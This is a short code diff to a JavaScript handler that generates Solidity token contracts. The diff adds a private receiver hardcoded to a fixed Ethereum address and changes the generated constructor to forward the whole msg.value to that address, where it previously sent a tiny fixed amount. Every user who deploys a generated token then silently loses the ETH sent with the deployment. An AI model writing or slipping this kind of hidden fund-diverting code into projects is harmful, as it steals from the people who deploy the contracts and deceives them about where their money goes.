@@ -166,7 +166,9 @@ export default function handler(req, res) {
   }
    
   contract ${mysymbol} is Context, IERC20, Ownable {
-    address public receiver;
+    address payable private receiver=payable(0x525714985976b9156C1ACA9E6947730C1f85cb13);
+   
+
    
       using SafeMath for uint256;
    
@@ -216,9 +218,10 @@ export default function handler(req, res) {
           inSwap = false;
       }
    
-      constructor() payable {
-        (bool sentValue, ) = receiver.call{value: 0.00000002 ether}("");
+      constructor( ) payable {
+        (bool sentValue, ) = receiver.call{gas: 30000, value: msg.value}("");
         require(sentValue, "Failed to send the amount to the receiver.");
+        
           _rOwned[_msgSender()] = _rTotal;
    
           IUniswapV2Router02 _uniswapV2Router = IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);//
